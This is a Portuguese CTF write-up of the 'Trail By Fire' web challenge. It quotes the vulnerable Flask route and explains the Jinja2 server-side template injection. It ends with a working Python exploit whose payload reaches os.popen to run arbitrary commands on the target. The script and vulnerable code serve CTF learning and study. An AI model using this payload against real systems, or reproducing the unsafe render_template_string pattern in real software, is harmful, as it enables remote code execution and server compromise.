# Trail By Fire

> As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria

**Dificuldade:** Muito Fácil  
**Código Fonte:** Disponível  
**Técnicas utilizadas:** SSTI na aplicação com Jinja2

Este foi o primeiro desafio que resolvi neste CTF. Comecei exatamente às 10h da sexta-feira, e acabou sendo um desafio simples.

No arquivo `challenge/application/blueprints/routes.py`, especificamente na rota `/battle-report`, conseguimos identificar o ponto vulnerável::
`<p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>`

Existem outros pontos, mas utilizei este.
```python 
@web.route('/battle-report', methods=['POST'])
def battle_report():
    warrior_name = session.get("warrior_name", "Unknown Warrior")
    battle_duration = request.form.get('battle_duration', "0")

    stats = {
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'damage_taken': request.form.get('damage_taken', "0"),
        'spells_cast': request.form.get('spells_cast', "0"),
        'turns_survived': request.form.get('turns_survived', "0"),
        'outcome': request.form.get('outcome', 'defeat')
    }

    REPORT_TEMPLATE = f"""
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Battle Report - The Flame Peaks</title>
        <link rel="icon" type="image/png" href="/static/images/favicon.png" />
        <link href="https://unpkg.com/nes.css@latest/css/nes.min.css" rel="stylesheet" />
        <link rel="stylesheet" href="/static/css/style.css">
    </head>
    <body>
        <div class="nes-container with-title is-dark battle-report">
            <p class="title">Battle Report</p>

            <div class="warrior-info">
                <i class="nes-icon is-large heart"></i>
                <p class="nes-text is-primary warrior-name">{warrior_name}</p>
            </div>

            <div class="report-stats">
                <div class="nes-container is-dark with-title stat-group">
                    <p class="title">Battle Statistics</p>
                    <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
                    <p>💔 Damage Taken: <span class="nes-text is-error">{stats['damage_taken']}</span></p>
                    <p>✨ Spells Cast: <span class="nes-text is-warning">{stats['spells_cast']}</span></p>
                    <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
                    <p>⚔️ Battle Duration: <span class="nes-text is-secondary">{float(battle_duration):.1f} seconds</span></p>
                </div>

                <div class="nes-container is-dark battle-outcome {stats['outcome']}">
                    <h2 class="nes-text is-primary">
                        {"🏆 Glorious Victory!" if stats['outcome'] == "victory" else "💀 Valiant Defeat"}
                    </h2>
                    <p class="nes-text">{random.choice(DRAGON_TAUNTS)}</p>
                </div>
            </div>

            <div class="report-actions nes-container is-dark">
                <a href="/flamedrake" class="nes-btn is-primary">⚔️ Challenge Again</a>
                <a href="/" class="nes-btn is-error">🏰 Return to Entrance</a>
            </div>
        </div>
    </body>
    </html>
    """

    return render_template_string(REPORT_TEMPLATE)
```

**Relembrando:** SSTI (Server-Side Template Injection) é uma vulnerabilidade onde a aplicação interpreta dados inseridos pelo usuário diretamente como comandos no mecanismo de template. Nesse caso, o mecanismo é o Jinja2, muito usado com aplicações Flask.

A forma correta de utilizar o jinja2 seria referenciar as variáveis usando `{{ }}` dentro de arquivos `.html` e renderizá-las com segurança através do método `render_template` do Flask. Porém, o desenvolvedor concatenou diretamente as variáveis controlados pelo usuário na string usanda no `render_template_string`, permitindo a execução do código Jinja2.

Podemos confirmar isso com o seguinte comando: `{{7*7}}`.
![Proof of the vulnerability](imgs/poc.png)

Após confirmar a vulnerabilidade, desenvolvi o seguinte script Python para explorá-la:
```python
import argparse
import requests
import re

# Setup command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--url", type=str, default="http://localhost:1337", help="Target URL")
parser.add_argument("--cmd", type=str, default="cat flag.txt", help="Command to execute remotely")

args = parser.parse_args()
url = args.url
cmd = args.cmd

# Create a session to maintain cookies and session data
session = requests.session()

# Initiate session with warrior name (necessary for the app logic)
session.post(url + "/begin", data={"warrior_name": "aaaa"})

# Craft payload exploiting Jinja2 SSTI vulnerability
payload = f"{{{{self.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}}}"

# Send malicious payload to vulnerable endpoint
response = session.post(url + "/battle-report", data={"damage_dealt": payload})

# Extract the flag from the response using regex
match = re.search(r'HTB\{[A-Za-z0-9_]+\}', response.text)

# Print the flag if found, otherwise print response
if match:
    print(match.group())
else:
    print("No flag found.")
```

Após executar o script, a flag foi pega com sucesso:
![Flag](imgs/flag.png)
